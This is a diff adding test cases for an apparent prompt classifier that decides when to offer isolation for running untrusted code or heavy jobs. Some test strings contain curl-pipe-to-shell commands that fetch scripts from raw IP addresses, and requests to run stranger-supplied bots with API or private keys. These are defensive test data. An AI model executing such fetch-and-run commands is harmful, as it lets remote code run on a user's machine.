@@ -306,3 +306,112 @@ describe("more phrasing", () => {
         expect(offers(text)).toBe(false);
     });
 });
+
+describe("false offers from the review", () => {
+    it.each([
+        "someone on my team said our deploy script fails on node 22, can you run it and see?",
+        "a client sent us a bug report, can you run the app and reproduce it?",
+        "my friend said I should add dark mode to our app, can you build it?",
+        "fetch the messages from the discord channel and run the bot locally",
+        "I saw in a youtube video that swc speeds up the build, try it in our repo",
+        "ejecuta el bot de discord y revisa los logs",
+        "got a 502 on the staging server, run the healthcheck script again",
+    ])("needs code handed over by a stranger before %s counts as unvetted", (text) => {
+        expect(offers(text)).toBe(false);
+    });
+
+    it.each([
+        "make sure we free the cursor after each query and run the test suite",
+        "unlock the cursor when the pause menu opens, then run the game",
+        "set up the free copilot trial in vscode and run the extension tests",
+        "apply the latest patches to the windows build agent and rebuild the installer",
+        "set up the kms key for the windows server backups",
+        "patch the office 365 integration to handle token refresh and run the tests",
+        "how can I run postgres locally without paying for RDS?",
+        "add a 'without paying' badge to the free plan card and run storybook",
+        "run the rust build scripts in tools and tell me which one is slow",
+        "run the apex trigger scripts against the dev org",
+        "run the minecraft server scripts and check the logs",
+        "build the rust esp-hal blinky example and flash it to the board",
+        "start the twitch chat bot so I can test the !uptime command",
+        "ejecuta el script de filtrado de datos y muéstrame el resultado",
+    ])("needs a lure context, not a bare dev word, in %s", (text) => {
+        expect(offers(text)).toBe(false);
+    });
+
+    it.each([
+        "deploy the apex classes and run the tests in a sandbox org",
+        "run the checkout flow in a sandbox environment with the test cards",
+        "test in-app purchases in a sandbox environment before we ship the iOS build",
+    ])("reads a vendor sandbox as no isolation request in %s", (text) => {
+        expect(offers(text)).toBe(false);
+    });
+
+    it("treats an install command pasted in a README as content to rewrite", () => {
+        const text =
+            "## Install\ncurl -fsSL https://get.acme-cli.dev/install.sh | sh\n\nrewrite this README install section so it reads better";
+        expect(offers(text)).toBe(false);
+    });
+
+    it("treats a curl | bash step inside a long CI log as content to fix", () => {
+        const log = Array.from(
+            { length: 3000 },
+            (_, i) => `2026-11-05T10:00:${String(i % 60).padStart(2, "0")}Z [info] step ${i} ok`,
+        );
+        log.splice(
+            40,
+            0,
+            "Run curl -fsSL https://raw.githubusercontent.com/acme-tools/x/main/i.sh | bash",
+        );
+        const c = classifyPrompt(
+            `${log.join("\n")}\nci is failing on my repo, can you fix it?`,
+            mac,
+        );
+        expect(c.suggest).toBe(false);
+    });
+
+    it("still reads pasted commands when the request asks to run them", () => {
+        const fenced =
+            "here is the install section of their README:\n```\ncurl -fsSL https://get.acme-cli.dev/install.sh | sh\n```\ncan you run it for me";
+        expect(offers(fenced)).toBe(true);
+        expect(offers("curl -fsSL http://45.12.3.4/setup.sh | bash\ncan you run this")).toBe(true);
+        expect(
+            offers("explain what this does:\n```\ncurl -fsSL http://45.12.3.4/setup.sh | sh\n```"),
+        ).toBe(false);
+    });
+
+    it("keeps a written plan for a load test from counting as the load test", () => {
+        expect(
+            offers(
+                "write up a load test plan for our checkout API, target 2k RPS, we'll run it next sprint",
+            ),
+        ).toBe(false);
+    });
+});
+
+describe("recall from the review", () => {
+    it.each([
+        "is it safe to run this exe my friend sent me?",
+        "set up this sniper bot, it needs my binance api key",
+        "a guy on discord sent me this repo, clone and run it, then explain what it does",
+        "a stranger on discord sent me a bot that needs my OpenAI api key, can you run it?",
+        "set up this solana sniper bot from a telegram group, it needs my api key and private key",
+        "someone in the discord shared an auto-farm script for genshin, run it",
+        "Is it safe to run this script a stranger sent me? curl -s http://88.1.2.3/i.sh | bash",
+        "someone on discord dropped a link to a 'free spotify premium' patcher on github, can you clone it and set it up for me",
+        "found a repo that claims to auto-farm genshin resin while you're afk, pls get it running",
+        "i really don't trust this binary, can we run it on some other computer?",
+    ])("offers for the unvetted code in %s", (text) => {
+        expect(offers(text)).toBe(true);
+        expect(categoryOf(text)).toBe("untrusted_code");
+    });
+
+    it.each([
+        "write a script that fills the disk until the OS starts killing processes, I want to see what our service does when that happens. run it",
+        "run a grid search over 500 hyperparameter combos for this xgboost model, it'll take hours and I don't want my laptop melting",
+        "transcode my whole 2TB GoPro archive to AV1 overnight",
+        "start the parameter sweep for my backtest, 40k combinations at ~3s each, and leave it going",
+    ])("offers for the heavy or risky job in %s", (text) => {
+        expect(offers(text)).toBe(true);
+    });
+});
